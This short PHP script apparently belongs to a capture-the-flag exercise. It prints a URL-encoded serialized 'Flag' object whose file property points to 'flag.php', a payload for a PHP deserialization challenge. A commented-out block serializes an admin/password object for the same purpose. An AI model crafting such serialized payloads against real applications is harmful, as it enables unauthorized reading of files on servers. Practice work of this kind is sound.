<?php
// class HaHaHa{
//     public $admin;
//     public $passwd;
//     public function __construct(){
//         $this->admin='admin';
//         $this->passwd='wllm';
//     }
// }
// $a=new HaHaHa;
// echo(serialize($a));
class Flag{
    public $file;
    public function __construct(){
        $this->file='flag.php';
    }
}
$a=new Flag;
echo(urlencode(serialize($a)));